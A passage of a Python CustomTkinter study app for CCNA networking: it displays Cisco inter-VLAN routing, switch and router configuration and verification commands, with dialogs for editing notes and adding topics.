SW1(config-if)# switchport trunk native vlan 99
SW1(config-if)# switchport trunk allowed vlan 10,20,30,99
!
! 3. Access Ports for VLANs
SW1(config)# interface range fastethernet 0/1-10
SW1(config-if-range)# switchport mode access
SW1(config-if-range)# switchport access vlan 10
!
SW1(config)# interface range fastethernet 0/11-20
SW1(config-if-range)# switchport mode access
SW1(config-if-range)# switchport access vlan 20
!
! 4. Static Routes (If multiple routers exist)
R2(config)# ip route 192.168.10.0 255.255.255.0 10.0.0.1
R2(config)# ip route 192.168.20.0 255.255.255.0 10.0.0.1
R2(config)# ip route 192.168.30.0 255.255.255.0 10.0.0.1
!
! 5. Default Route for Internet Access
R1(config)# ip route 0.0.0.0 0.0.0.0 203.0.113.1"""
        
        static_box = ctk.CTkTextbox(static_route_frame, height=250, 
                                   font=("Consolas", 12), 
                                   fg_color=("#1e1e1e", "#0a0a0a"), 
                                   wrap="none")
        static_box.insert("1.0", static_text)
        self.apply_highlighting(static_box, static_text, highlight_term)
        static_box.configure(state="disabled")
        static_box.pack(fill="x", padx=15, pady=(5, 15))
        
        # ===== 2. VERIFICATION COMMANDS =====
        verify_iv_frame = ctk.CTkFrame(iv_content, fg_color=("#2a2a3a", "#1e1e2e"), corner_radius=8)
        verify_iv_frame.pack(fill="x", pady=8)
        
        ctk.CTkLabel(verify_iv_frame, text="✅ INTER-VLAN VERIFICATION", 
                    font=("Consolas", 15, "bold"), text_color="#A3E4D7").pack(anchor="w", padx=15, pady=(10, 5))
        
        verify_iv_text = """! === INTER-VLAN VERIFICATION ===
! Router Commands
R1# show ip interface brief
R1# show interfaces trunk
R1# show vlans
R1# show ip route
R1# show dot1q-tunnel
R1# debug dot1q packets
!
! Switch Commands
SW1# show vlan brief
SW1# show interfaces trunk
SW1# show interfaces gigabitethernet 0/1 switchport
SW1# show spanning-tree
SW1# show mac address-table
!
! Connectivity Tests
R1# ping 192.168.10.2
R1# ping 192.168.20.2
R1# traceroute 192.168.30.2"""
        
        verify_iv_box = ctk.CTkTextbox(verify_iv_frame, height=180, 
                                      font=("Consolas", 12), 
                                      fg_color=("#1e1e1e", "#0a0a0a"), 
                                      wrap="none")
        verify_iv_box.insert("1.0", verify_iv_text)
        self.apply_highlighting(verify_iv_box, verify_iv_text, highlight_term)
        verify_iv_box.configure(state="disabled")
        verify_iv_box.pack(fill="x", padx=15, pady=(5, 15))
        
        # ===== 3. ROUTER-ON-A-STICK DIAGRAM =====
        diagram_frame = ctk.CTkFrame(iv_content, fg_color=("#2a2a3a", "#1e1e2e"), corner_radius=8)
        diagram_frame.pack(fill="x", pady=8)
        
        ctk.CTkLabel(diagram_frame, text="📊 ROUTER-ON-A-STICK TOPOLOGY", 
                    font=("Consolas", 15, "bold"), text_color="#FFB86B").pack(anchor="w", padx=15, pady=(10, 5))
        
        diagram_text = """═══════════════════════════════════════════════════════════════
                      Router-on-a-Stick Topology
═══════════════════════════════════════════════════════════════

                      ┌─────────────┐
                      │   Router    │
                      │   (R1)      │
                      └──────┬──────┘
                             │ Trunk (802.1Q)
                             │ Gi0/0
                    ┌────────┴────────┐
                    │   Switch (SW1)  │
                    └────────┬────────┘
          ┌─────────────────┼─────────────────┐
          │                 │                 │
     ┌────┴────┐      ┌────┴────┐      ┌────┴────┐
     │ VLAN 10 │      │ VLAN 20 │      │ VLAN 30 │
     │  Data   │      │  Voice  │      │  Guest  │
     │192.168. │      │172.16.  │      │10.0.0.  │
     │ 10.0/24 │      │ 20.0/24 │      │ 30.0/24 │
     └─────────┘      └─────────┘      └─────────┘

═══════════════════════════════════════════════════════════════
• Router subinterfaces: Gi0/0.10, Gi0/0.20, Gi0/0.30
• Switch trunk: Gi0/1 with allowed VLANs 10,20,30
• Native VLAN: 99 (untagged)
═══════════════════════════════════════════════════════════════"""
        
        diagram_box = ctk.CTkTextbox(diagram_frame, height=200, 
                                   font=("Consolas", 12), 
                                   fg_color=("#1e1e1e", "#0a0a0a"), 
                                   wrap="none")
        diagram_box.insert("1.0", diagram_text)
        self.apply_highlighting(diagram_box, diagram_text, highlight_term)
        diagram_box.configure(state="disabled")
        diagram_box.pack(fill="x", padx=15, pady=(5, 15))

    def edit_notes_dialog(self, title, item_data):
        """Open dialog to edit SHAR7/Notes"""
        dialog = ctk.CTkToplevel(self)
        dialog.title(f"✏️ Edit SHAR7 - {title[:50]}...")
        dialog.geometry("700x650")
        dialog.attributes("-topmost", True)
        dialog.grab_set()
        
        # Header
        ctk.CTkLabel(dialog, text=f"📘 EDIT SHAR7 / NOTES", 
                    font=("Impact", 24), text_color="#FF9F1C").pack(pady=15)
        
        ctk.CTkLabel(dialog, text=f"Topic: {title}", 
                    font=("Arial", 14), text_color="#AAAAAA").pack(pady=5)
        
        # Notes Editor
        ctk.CTkLabel(dialog, text="Add your explanation, tips, or notes:", 
                    font=("Arial", 16), anchor="w").pack(pady=10, padx=20, anchor="w")
        
        notes_editor = ctk.CTkTextbox(dialog, width=650, height=250, 
                                     font=("Consolas", 14), 
                                     wrap="word",
                                     border_width=2,
                                     border_color="#FF9F1C")
        notes_editor.insert("1.0", item_data.get('notes', ''))
        
        # ============ PASTE FEATURE IN EDIT DIALOG ============
        notes_editor.bind("<Control-v>", lambda e: self.paste_text(e, notes_editor))
        notes_editor.bind("<Shift-Insert>", lambda e: self.paste_text(e, notes_editor))
        notes_editor.bind("<Button-2>", lambda e: self.paste_text(e, notes_editor))  # Middle mouse button
        
        notes_editor.pack(pady=10, padx=20)
        
        # ============ FORMATTING TOOLBAR FOR EDIT DIALOG ============
        format_frame_edit = ctk.CTkFrame(dialog, fg_color="transparent")
        format_frame_edit.pack(pady=(0, 10))
        
        # Text Style Buttons
        ctk.CTkButton(format_frame_edit, text="B", width=32, height=28,
                     fg_color="#444", hover_color="#666",
                     command=lambda: self.apply_bold(notes_editor),
                     font=("Consolas", 14, "bold")).pack(side="left", padx=2)
        
        ctk.CTkButton(format_frame_edit, text="I", width=32, height=28,
                     fg_color="#444", hover_color="#666",
                     command=lambda: self.apply_italic(notes_editor),
                     font=("Consolas", 14, "italic")).pack(side="left", padx=2)
        
        ctk.CTkButton(format_frame_edit, text="U", width=32, height=28,
                     fg_color="#444", hover_color="#666",
                     command=lambda: self.apply_underline(notes_editor),
                     font=("Consolas", 14, "underline")).pack(side="left", padx=2)
        
        ctk.CTkButton(format_frame_edit, text="</>", width=42, height=28,
                     fg_color="#444", hover_color="#666",
                     command=lambda: self.apply_code(notes_editor),
                     font=("Consolas", 12)).pack(side="left", padx=2)
        
        ctk.CTkLabel(format_frame_edit, text="|", text_color="#666", 
                    font=("Arial", 16)).pack(side="left", padx=5)
        
        # Alignment
        ctk.CTkButton(format_frame_edit, text="⬅️", width=32, height=28,
                     fg_color="#444", hover_color="#666",
                     command=lambda: self.align_left(notes_editor),
                     font=("Arial", 14)).pack(side="left", padx=2)
        
        ctk.CTkButton(format_frame_edit, text="⬇️", width=32, height=28,
                     fg_color="#444", hover_color="#666",
                     command=lambda: self.align_center(notes_editor),
                     font=("Arial", 14)).pack(side="left", padx=2)
        
        ctk.CTkButton(format_frame_edit, text="➡️", width=32, height=28,
                     fg_color="#444", hover_color="#666",
                     command=lambda: self.align_right(notes_editor),
                     font=("Arial", 14)).pack(side="left", padx=2)
        
        ctk.CTkLabel(format_frame_edit, text="|", text_color="#666", 
                    font=("Arial", 16)).pack(side="left", padx=5)
        
        # Colors
        colors = [("🔴", "red"), ("🔵", "blue"), ("🟢", "green"), ("🟡", "yellow"), ("🟣", "purple")]
        for icon, color in colors:
            ctk.CTkButton(format_frame_edit, text=icon, width=32, height=28,
                        fg_color="#444", hover_color="#666",
                        command=lambda c=color: self.apply_color(notes_editor, c),
                        font=("Arial", 14)).pack(side="left", padx=2)
        
        ctk.CTkLabel(format_frame_edit, text="|", text_color="#666", 
                    font=("Arial", 16)).pack(side="left", padx=5)
        
        # Font Size
        sizes = [("S", "small"), ("M", "medium"), ("L", "large")]
        for text, size in sizes:
            ctk.CTkButton(format_frame_edit, text=text, width=32, height=28,
                        fg_color="#444", hover_color="#666",
                        command=lambda s=size: self.set_font_size(notes_editor, s),
                        font=("Arial", 12)).pack(side="left", padx=2)
        
        ctk.CTkLabel(format_frame_edit, text="|", text_color="#666", 
                    font=("Arial", 16)).pack(side="left", padx=5)
        
        # Lists
        ctk.CTkButton(format_frame_edit, text="•", width=32, height=28,
                     fg_color="#444", hover_color="#666",
                     command=lambda: self.insert_bullet_list(notes_editor),
                     font=("Arial", 18)).pack(side="left", padx=2)
        
        ctk.CTkButton(format_frame_edit, text="1.", width=42, height=28,
                     fg_color="#444", hover_color="#666",
                     command=lambda: self.insert_numbered_list(notes_editor),
                     font=("Arial", 12)).pack(side="left", padx=2)
        
        # ============ END FORMATTING TOOLBAR ============
        
        # ============ PASTE ICON BUTTON IN EDIT DIALOG - NEW ============
        paste_frame = ctk.CTkFrame(dialog, fg_color="transparent")
        paste_frame.pack(pady=(0, 10))
        
        def paste_to_editor():
            """Paste clipboard content directly into notes editor"""
            try:
                clipboard_text = self.clipboard_get()
                if clipboard_text:
                    try:
                        if notes_editor.tag_ranges("sel"):
                            notes_editor.delete("sel.first", "sel.last")
                        notes_editor.insert("insert", clipboard_text)
                    except:
                        notes_editor.insert("end", clipboard_text)
                messagebox.showinfo("✅ Paste", "Text pasted successfully!")
            except:
                messagebox.showerror("❌ Error", "No text found in clipboard!")
        
        ctk.CTkLabel(paste_frame, text="Quick Paste: ", 
                    font=("Arial", 12), text_color="#AAAAAA").pack(side="left", padx=(0, 5))
        
        ctk.CTkButton(paste_frame, text="📋 Paste from Clipboard", 
                     command=paste_to_editor,
                     fg_color="#4A6FA5", hover_color="#2a4a7a",
                     width=180, height=32,
                     font=("Arial", 12)).pack(side="left", padx=5)
        
        ctk.CTkButton(paste_frame, text="📋 Paste at Cursor", 
                     command=lambda: self.paste_text(None, notes_editor),
                     fg_color="#6B7280", hover_color="#4B5563",
                     width=150, height=32,
                     font=("Arial", 12)).pack(side="left", padx=5)
        
        # Buttons Frame
        btn_frame = ctk.CTkFrame(dialog, fg_color="transparent")
        btn_frame.pack(pady=20)
        
        def save_notes():
            new_notes = notes_editor.get("1.0", "end-1c")
            self.data[self.current_tab][title]['notes'] = new_notes
            self.save_data(self.data)
            dialog.destroy()
            self.refresh_ui(filter_text=self.current_search_query)
            messagebox.showinfo("✅ Success", "SHAR7/Notes updated successfully!")
        
        def add_template():
            templates = [
                "🔑 **KEY POINTS:**\n• \n• \n• \n\n⚠️ **WARNING:** \n\n💡 **TIP:** ",
                "📝 **SUMMARY:**\n\n⚙️ **CONFIGURATION STEPS:**\n1. \n2. \n3. \n\n✅ **VERIFICATION:**\n- ",
                "🎯 **USE CASE:**\n\n🔍 **TROUBLESHOOTING:**\n- Check \n- Verify \n- Test "
            ]
            
            popup = ctk.CTkToplevel(dialog)
            popup.title("📋 Template Selector")
            popup.geometry("400x300")
            popup.attributes("-topmost", True)
            
            ctk.CTkLabel(popup, text="Choose a template:", 
                        font=("Arial", 16)).pack(pady=15)
            
            for i, template in enumerate(templates, 1):
                btn = ctk.CTkButton(popup, text=f"Template {i}", 
                                  command=lambda t=template: [notes_editor.insert("end", t), popup.destroy()],
                                  width=300, height=40)
                btn.pack(pady=8)
        
        ctk.CTkButton(btn_frame, text="💾 Save Notes", command=save_notes, 
                     fg_color="#2da44e", hover_color="#2c974b", 
                     width=150, height=40, font=("Arial", 14)).pack(side="left", padx=10)
        
        ctk.CTkButton(btn_frame, text="📋 Template", command=add_template,
                     fg_color="#8B5CF6", hover_color="#7C3AED",
                     width=150, height=40, font=("Arial", 14)).pack(side="left", padx=10)
        
        ctk.CTkButton(btn_frame, text="✖ Cancel", command=dialog.destroy,
                     fg_color="#6B7280", hover_color="#4B5563",
                     width=150, height=40, font=("Arial", 14)).pack(side="left", padx=10)

    def zoom_textbox(self, event, textbox):
        """Zoom text in/out with Ctrl+Scroll"""
        try:
            if event.delta > 0:
                current_font = textbox.cget("font")
                if isinstance(current_font, tuple) and len(current_font) >= 2:
                    size = current_font[1] + 1
                else:
                    size = 14
                textbox.configure(font=("Consolas", min(size, 24)))
            else:
                current_font = textbox.cget("font")
                if isinstance(current_font, tuple) and len(current_font) >= 2:
                    size = current_font[1] - 1
                else:
                    size = 12
                textbox.configure(font=("Consolas", max(size, 10)))
        except:
            pass

    def zoom_in(self, textbox):
        """Zoom in"""
        try:
            current_font = textbox.cget("font")
            if isinstance(current_font, tuple) and len(current_font) >= 2:
                size = current_font[1] + 1
            else:
                size = 14
            textbox.configure(font=("Consolas", min(size, 24)))
        except:
            pass

    def zoom_out(self, textbox):
        """Zoom out"""
        try:
            current_font = textbox.cget("font")
            if isinstance(current_font, tuple) and len(current_font) >= 2:
                size = current_font[1] - 1
            else:
                size = 12
            textbox.configure(font=("Consolas", max(size, 10)))
        except:
            pass

    def zoom_reset(self, textbox):
        """Reset zoom"""
        try:
            textbox.configure(font=("Consolas", 13))
        except:
            pass

    def show_popup(self, title, content):
        """Show popup window"""
        popup = ctk.CTkToplevel(self)
        popup.title(title)
        popup.geometry("800x600")
        popup.attributes("-topmost", True)
        
        lbl = ctk.CTkLabel(popup, text=title, font=("Impact", 24), text_color="#3B8ED0")
        lbl.pack(pady=20)
        
        txt = ctk.CTkTextbox(popup, width=750, height=500, font=("Consolas", 13), wrap="word")
        txt.insert("1.0", content)
        txt.configure(state="disabled")
        txt.pack(pady=15, padx=20)

    def apply_highlighting(self, text_widget, content, search_term=""):
        """Apply syntax highlighting and search highlighting - YELLOW BACKGROUND"""
        # Remove existing tags
        for tag in text_widget.tag_names():
            text_widget.tag_delete(tag)
        
        # Configure tags WITHOUT 'font' parameter
        text_widget.tag_config("comment", foreground="#6c757d")
        text_widget.tag_config("keyword", foreground="#FFB703")
        text_widget.tag_config("command", foreground="#A9D6E5")
        text_widget.tag_config("highlight", background="#FFE66D", foreground="black")
        text_widget.tag_config("config_header", foreground="#FF6B6B")
        text_widget.tag_config("verify_header", foreground="#4ECDC4")

        # Syntax highlighting
        lines = content.split('\n')
        for i, line in enumerate(lines):
            if "=== CONFIGURATION ===" in line or "--- CONFIGURATION ---" in line:
                text_widget.tag_add("config_header", f"{i+1}.0", f"{i+1}.end")
            elif "=== VERIFICATION ===" in line or "--- VERIFICATION ---" in line:
                text_widget.tag_add("verify_header", f"{i+1}.0", f"{i+1}.end")
            elif line.strip().startswith("!") or line.strip().startswith("#") or line.strip().startswith("#!"):
                text_widget.tag_add("comment", f"{i+1}.0", f"{i+1}.end")
            elif any(cmd in line.lower() for cmd in ['show ', 'debug ', 'clear ', 'ping', 'traceroute', 'ssh', 'telnet', 'nmap', 'curl', 'wget', 'systemctl', 'docker']):
                text_widget.tag_add("keyword", f"{i+1}.0", f"{i+1}.end")

        # SEARCH HIGHLIGHTING - YELLOW BACKGROUND
        if search_term and len(search_term) > 1:
            start_pos = "1.0"
            while True:
                start_pos = text_widget.search(search_term, start_pos, stopindex="end", nocase=True)
                if not start_pos: 
                    break
                end_pos = f"{start_pos}+{len(search_term)}c"
                text_widget.tag_add("highlight", start_pos, end_pos)
                start_pos = end_pos

    def open_add_dialog(self):
        """Open dialog to add new topic"""
        dialog = ctk.CTkToplevel(self)
        dialog.title("➕ Add New Topic")
        dialog.geometry("700x1000")
        dialog.attributes("-topmost", True)

        ctk.CTkLabel(dialog, text="Category:", font=("Arial", 16)).pack(pady=8)
        cat_menu = ctk.CTkOptionMenu(dialog, 
                                    values=["📘 CCNA Fundamentals", "🔄 LAN Switching", 
                                           "🌐 Routing", "⚙️ IP Services", 
                                           "🔐 Security", "✅ Verification", "🐧 Linux Ops"], 
                                    font=("Arial", 14))
        cat_menu.pack(pady=8)

        ctk.CTkLabel(dialog, text="Title:", font=("Arial", 16)).pack(pady=8)
        title_entry = ctk.CTkEntry(dialog, width=550, 
                                  placeholder_text="e.g., 01. Basic Switch Configuration", 
                                  font=("Arial", 14))
        title_entry.pack(pady=8)

        ctk.CTkLabel(dialog, text="Configuration Commands:", font=("Arial", 16)).pack(pady=8)
        code_text = ctk.CTkTextbox(dialog, width=550, height=250, font=("Consolas", 13))
        code_text.pack(pady=8)

        ctk.CTkLabel(dialog, text="Verification Commands:", font=("Arial", 16)).pack(pady=8)
        verify_text = ctk.CTkTextbox(dialog, width=550, height=200, font=("Consolas", 13))
        verify_text.pack(pady=8)

        ctk.CTkLabel(dialog, text="Example / Description:", font=("Arial", 16)).pack(pady=8)
        extra_text = ctk.CTkTextbox(dialog, width=550, height=200, font=("Consolas", 13))
        extra_text.pack(pady=8)

        ctk.CTkLabel(dialog, text="Initial SHAR7 / Notes:", font=("Arial", 16)).pack(pady=8)
        notes_text = ctk.CTkTextbox(dialog, width=550, height=150, font=("Consolas", 13))
        notes_text.pack(pady=8)

        def save():
            cat = cat_menu.get()
            title = title_entry.get()
            code = code_text.get("1.0", "end-1c")
            verify = verify_text.get("1.0", "end-1c")
            extra = extra_text.get("1.0", "end-1c")
            notes = notes_text.get("1.0", "end-1c")
            
            if title and code:
                if cat not in self.data:
                    self.data[cat] = {}
                self.data[cat][title] = {
                    "code": code,
                    "verification": verify,
                    "example": extra,
                    "desc": extra,
                    "notes": notes
                }
                self.save_data(self.data)
                self.refresh_ui()
                dialog.destroy()
                messagebox.showinfo("✅ Success", f"Topic '{title}' added successfully!")
            else:
                messagebox.showerror("❌ Error", "Title and Configuration Commands are required.")

        ctk.CTkButton(dialog, text="💾 Save Topic", command=save, 
                     fg_color="green", height=45, font=("Arial", 16)).pack(pady=30)

    def get_ccna_database(self):
        """Return complete CCNA database with all Linux commands from Excel"""
        return {
            "📘 CCNA Fundamentals": {
                # ==================== BASIC SWITCH CONFIGURATION ====================
                "01. 🔧 Basic Switch Configuration (SSH, VLAN, Port Security)": {
                    "code": """! ==================== BASIC SWITCH CONFIGURATION ====================
! 1. Hostname
Switch(config)# hostname SW1

! 2. Console Security
Switch(config)# line console 0
Switch(config-line)# password cisco
Switch(config-line)# login
Switch(config-line)# logging synchronous
Switch(config-line)# exec-timeout 5 0

! 3. Enable Passwords
Switch(config)# enable password cisco
Switch(config)# enable secret class
Switch(config)# service password-encryption

! 4. Management IP (VLAN 1)
Switch(config)# interface vlan 1
Switch(config-if)# ip address 192.168.1.2 255.255.255.0
Switch(config-if)# no shutdown
Switch(config)# ip default-gateway 192.168.1.1

! 5. Banner
Switch(config)# banner motd ^C
Unauthorized Access Prohibited. Authorized Personnel Only.
^C

! 6. SSH Configuration (RSA 2048, Version 2)
Switch(config)# ip domain-name cisco.lab
Switch(config)# crypto key generate rsa modulus 2048
Switch(config)# ip ssh version 2
Switch(config)# ip ssh time-out 60
Switch(config)# ip ssh authentication-retries 3
Switch(config)# username admin privilege 15 secret cisco123

! 7. VTY Lines (SSH Only)
Switch(config)# line vty 0 15
Switch(config-line)# login local
Switch(config-line)# transport input ssh
Switch(config-line)# exec-timeout 10 0
Switch(config-line)# logging synchronous

! 8. Disable Unused Services
Switch(config)# no ip domain-lookup
Switch(config)# no cdp run

! 9. Port Security (Example)
Switch(config)# interface fastethernet 0/1
Switch(config-if)# switchport mode access
Switch(config-if)# switchport port-security
Switch(config-if)# switchport port-security maximum 2
Switch(config-if)# switchport port-security violation shutdown
Switch(config-if)# switchport port-security mac-address sticky

! 10. Save Configuration
Switch# copy running-config startup-config""",
                    "verification": """! ==================== VERIFICATION COMMANDS ====================
Switch# show running-config
Switch# show startup-config
Switch# show version
Switch# show ip interface brief
Switch# show interfaces vlan 1
Switch# show vlan brief
Switch# show ip ssh
Switch# show ssh
Switch# show crypto key mypubkey rsa
Switch# show users
Switch# show port-security
Switch# show port-security interface fastethernet 0/1
Switch# show mac address-table
Switch# ping 192.168.1.1""",
                    "example": "Hostname: SW1\nManagement IP: 192.168.1.2/24\nDefault Gateway: 192.168.1.1\nSSH: admin/cisco123\nPort Security: Max 2 MACs, Sticky MAC",
                    "notes": ""
                },
                
                # ==================== BASIC ROUTER CONFIGURATION ====================
                "02. 🔧 Basic Router Configuration (SSH, NAT, DHCP, Static Route)": {
                    "code": """! ==================== BASIC ROUTER CONFIGURATION ====================
! 1. Hostname
Router(config)# hostname R1

! 2. Console Security
Router(config)# line console 0
Router(config-line)# password cisco
Router(config-line)# login
Router(config-line)# logging synchronous
Router(config-line)# exec-timeout 5 0

! 3. Enable Passwords
Router(config)# enable password cisco
Router(config)# enable secret class
Router(config)# service password-encryption

! 4. Interface Configuration
! LAN Interface
Router(config)# interface gigabitethernet 0/0
Router(config-if)# description LAN Connection to Switch
Router(config-if)# ip address 192.168.1.1 255.255.255.0
Router(config-if)# no shutdown

! WAN Interface (Serial)
Router(config)# interface serial 0/0/0
Router(config-if)# description WAN Link to ISP
Router(config-if)# ip address 203.0.113.1 255.255.255.252
Router(config-if)# clock rate 128000
Router(config-if)# no shutdown

! Loopback Interface (Router ID)
Router(config)# interface loopback 0
Router(config-if)# ip address 1.1.1.1 255.255.255.255
Router(config-if)# no shutdown

! 5. Banner
Router(config)# banner motd ^C
Unauthorized Access Prohibited. Authorized Personnel Only.
^C

! 6. SSH Configuration (RSA 2048, Version 2)
Router(config)# ip domain-name cisco.lab
Router(config)# crypto key generate rsa modulus 2048
Router(config)# ip ssh version 2
Router(config)# ip ssh time-out 60
Router(config)# ip ssh authentication-retries 3
Router(config)# username admin privilege 15 secret cisco123

! 7. VTY Lines (SSH Only)
Router(config)# line vty 0 4
Router(config-line)# login local
Router(config-line)# transport input ssh
Router(config-line)# exec-timeout 10 0
Router(config-line)# logging synchronous

! 8. Disable Unused Services
Router(config)# no ip domain-lookup
Router(config)# no cdp run

! 9. Static Default Route
Router(config)# ip route 0.0.0.0 0.0.0.0 serial 0/0/0
Router(config)# ip route 0.0.0.0 0.0.0.0 203.0.113.2

! 10. Basic NAT (PAT - Overload)
Router(config)# access-list 1 permit 192.168.1.0 0.0.0.255
Router(config)# interface gigabitethernet 0/0
Router(config-if)# ip nat inside
Router(config)# interface serial 0/0/0
Router(config-if)# ip nat outside
Router(config)# ip nat inside source list 1 interface serial 0/0/0 overload

! 11. DHCP Server
Router(config)# ip dhcp excluded-address 192.168.1.1 192.168.1.10
Router(config)# ip dhcp pool LAN_POOL
Router(dhcp-config)# network 192.168.1.0 255.255.255.0
Router(dhcp-config)# default-router 192.168.1.1
Router(dhcp-config)# dns-server 8.8.8.8 8.8.4.4
Router(dhcp-config)# domain-name cisco.lab
Router(dhcp-config)# lease 7

! 12. Save Configuration
Router# copy running-config startup-config""",
                    "verification": """! ==================== VERIFICATION COMMANDS ====================
Router# show running-config
Router# show startup-config
Router# show version
Router# show ip interface brief
Router# show interfaces gigabitethernet 0/0
Router# show interfaces serial 0/0/0
Router# show controllers serial 0/0/0
Router# show ip route
Router# show ip route static
Router# show ip route 0.0.0.0
Router# show ip ssh
Router# show ssh
Router# show ip nat translations
Router# show ip nat statistics
Router# show ip dhcp binding
Router# show ip dhcp pool
Router# ping 192.168.1.2
Router# ping 203.0.113.2""",
                    "example": "Hostname: R1\nLAN IP: 192.168.1.1/24\nWAN IP: 203.0.113.1/30\nSSH: admin/cisco123\nDefault Route: 0.0.0.0/0 via Serial0/0/0\nPAT: Overload on Serial0/0/0\nDHCP Pool: 192.168.1.10-254",
                    "notes": ""
                },
                
                "03. IPv4 Addressing & Subnetting": {
                    "code": """! --- IPv4 ADDRESSING & SUBNETTING ---
! IP Subnet Zero (Enable all-zero subnet)
Router(config)# ip subnet-zero

! Classless Addressing
Router(config)# ip classless

! Loopback Interface (Router ID)
Router(config)# interface loopback 0
Router(config-if)# ip address 1.1.1.1 255.255.255.255
Router(config-if)# no shutdown

! Secondary IP Address
Router(config-if)# ip address 192.168.1.1 255.255.255.0 secondary

! VLSM Example
! Original: 192.168.100.0/24
! Subnetted: 192.168.100.64/26 (Network A - 62 hosts)
! Sub-subnetted: 192.168.100.128/27 (Network B - 30 hosts)
! Serial Links: 192.168.100.0/30 (Network E - 2 hosts)""",
                    "verification": """Router# show ip route
Router# show ip interface brief
Router# show ip protocols
Router# show running-config | include ip address
Router# debug ip routing
Router# ping 192.168.100.1
Router# traceroute 192.168.100.1""",
                    "example": "Network: 192.168.100.0/24\nSubnets: .64/26, .128/27, .192/27, .0/30\nValid Hosts: 192.168.100.1-62",
                    "notes": ""
                },
                
                "04. IPv6 Addressing Fundamentals": {
                    "code": """! --- IPv6 ADDRESSING ---
! Enable IPv6 Routing
Router(config)# ipv6 unicast-routing

! IPv6 on Interface - EUI-64
Router(config)# interface gigabitethernet 0/0
Router(config-if)# ipv6 enable
Router(config-if)# ipv6 address 2001:db8:acad:1::/64 eui-64

! Manual Global Unicast Address
Router(config-if)# ipv6 address 2001:db8:1:1::1/64

! Link-Local Manual Configuration
Router(config-if)# ipv6 address fe80::1 link-local

! IPv6 Static Route
Router(config)# ipv6 route 2001:db8:2:2::/64 2001:db8:1:1::2

! IPv6 Default Route
Router(config)# ipv6 route ::/0 2001:db8:1:1::2""",
                    "verification": """Router# show ipv6 interface brief
Router# show ipv6 route
Router# show ipv6 neighbors
Router# show ipv6 protocols
Router# ping ipv6 2001:db8:2:2::2""",
                    "example": "Global: 2001:db8:acad:1:21c:f6ff:fe12:3456/64\nLink-Local: fe80::1",
                    "notes": ""
                },
                
                "05. CDP & LLDP Configuration": {
                    "code": """! --- CDP & LLDP CONFIGURATION ---
! CDP Global
Router(config)# cdp run
Router(config)# cdp timer 30
Router(config)# cdp holdtime 120

! CDP Interface
Router(config)# interface gigabitethernet 0/0
Router(config-if)# cdp enable

! LLDP Global
Switch(config)# lldp run
Switch(config)# lldp timer 30
Switch(config)# lldp holdtime 120

! LLDP Interface
Switch(config)# interface gigabitethernet 0/1
Switch(config-if)# lldp transmit
Switch(config-if)# lldp receive""",
                    "verification": """Router# show cdp neighbors
Router# show cdp neighbors detail
Router# debug cdp packets

Switch# show lldp neighbors
Switch# show lldp neighbors detail
Switch# debug lldp packets""",
                    "example": "Device ID: R1\nLocal Intf: Gi0/0\nPlatform: ISR4321",
                    "notes": ""
                }
            },
            
            "🔄 LAN Switching": {
                "01. VLAN Configuration (Complete)": {
                    "code": """! --- VLAN CONFIGURATION ---
! Create Static VLANs
Switch(config)# vlan 10
Switch(config-vlan)# name DATA
Switch(config-vlan)# vlan 20
Switch(config-vlan)# name VOICE
Switch(config-vlan)# vlan 30
Switch(config-vlan)# name MANAGEMENT
Switch(config-vlan)# vlan 99
Switch(config-vlan)# name NATIVE

! Assign Ports to VLAN
Switch(config)# interface fastethernet 0/1
Switch(config-if)# switchport mode access
Switch(config-if)# switchport access vlan 10

! Range Configuration
Switch(config)# interface range fastethernet 0/2-8
Switch(config-if-range)# switchport mode access
Switch(config-if-range)# switchport access vlan 20

! Voice VLAN
Switch(config)# interface fastethernet 0/9
Switch(config-if)# switchport mode access
Switch(config-if)# switchport access vlan 10
Switch(config-if)# switchport voice vlan 20
Switch(config-if)# mls qos trust cos

! Delete VLAN
Switch(config)# no vlan 30
Switch# delete flash:vlan.dat""",
                    "verification": """Switch# show vlan brief
Switch# show vlan id 10
Switch# show vlan name DATA
Switch# show interfaces status
Switch# show interfaces vlan 10
Switch# show interfaces fastethernet 0/1 switchport
Switch# show interfaces fastethernet 0/9 switchport
Switch# show interfaces trunk
Switch# debug vlan packets""",
                    "example": "VLAN 10 = Data (192.168.10.0/24)\nVLAN 20 = Voice (172.16.20.0/24)\nVLAN 30 = Management\nVLAN 99 = Native",
                    "notes": ""
                },
                
                "02. DTP & Trunking Configuration": {
                    "code": """! --- DTP & TRUNKING ---
! 802.1Q Trunk
Switch(config)# interface gigabitethernet 0/1
Switch(config-if)# switchport trunk encapsulation dot1q
Switch(config-if)# switchport mode trunk

! DTP Modes
Switch(config-if)# switchport mode dynamic desirable
Switch(config-if)# switchport mode dynamic auto
Switch(config-if)# switchport nonegotiate

! Native VLAN
Switch(config-if)# switchport trunk native vlan 99

! Allowed VLANs
Switch(config-if)# switchport trunk allowed vlan 10,20,30,99
Switch(config-if)# switchport trunk allowed vlan add 40,50
Switch(config-if)# switchport trunk allowed vlan remove 30

! Pruning Eligible VLANs
Switch(config-if)# switchport trunk pruning vlan 10,20""",
                    "verification": """Switch# show interfaces trunk
Switch# show interfaces gigabitethernet 0/1 switchport
Switch# show dtp interface gigabitethernet 0/1
Switch# show dtp status
Switch# show interfaces trunk vlan
Switch# debug dtp packets""",
                    "example": "DTP default: dynamic auto\nBest practice: hardcode access ports with 'switchport mode access'\nNative VLAN: 99",
                    "notes": ""
                },
                
                "03. VTP (VLAN Trunking Protocol)": {
                    "code": """! --- VTP CONFIGURATION ---
! VTP Modes
Switch(config)# vtp mode server
Switch(config)# vtp mode client
Switch(config)# vtp mode transparent

! VTP Domain & Password
Switch(config)# vtp domain CCNA_LAB
Switch(config)# vtp password Cisco123

! VTP Version
Switch(config)# vtp version 1
Switch(config)# vtp version 2
Switch(config)# vtp version 3

! VTP Pruning
Switch(config)# vtp pruning

! VTP Primary Server (VTPv3)
Switch# vtp primary force
Switch# vtp primary vlan

! VTP Interface
Switch(config)# interface gigabitethernet 0/1
Switch(config-if)# vtp disable

! Security
Switch(config)# vtp password SECRET
Switch(config)# vtp domain CCNA_LAB password SECRET hidden""",
                    "verification": """Switch# show vtp status
Switch# show vtp password
Switch# show vtp counters
Switch# show vtp devices
Switch# show vlan
Switch# debug sw-vlan vtp events
Switch# debug sw-vlan vtp packets

! VTPv3 Specific
Switch# show vtp primary
Switch# show vtp devices detail""",
                    "example": "⚠️ WARNING: VTP Server can overwrite entire domain!\n✅ BEST PRACTICE: Use VTP Transparent mode\nVTPv3 supports extended VLANs (1006-4094)",
                    "notes": ""
                },
                
                "04. Spanning Tree Protocol (Complete)": {
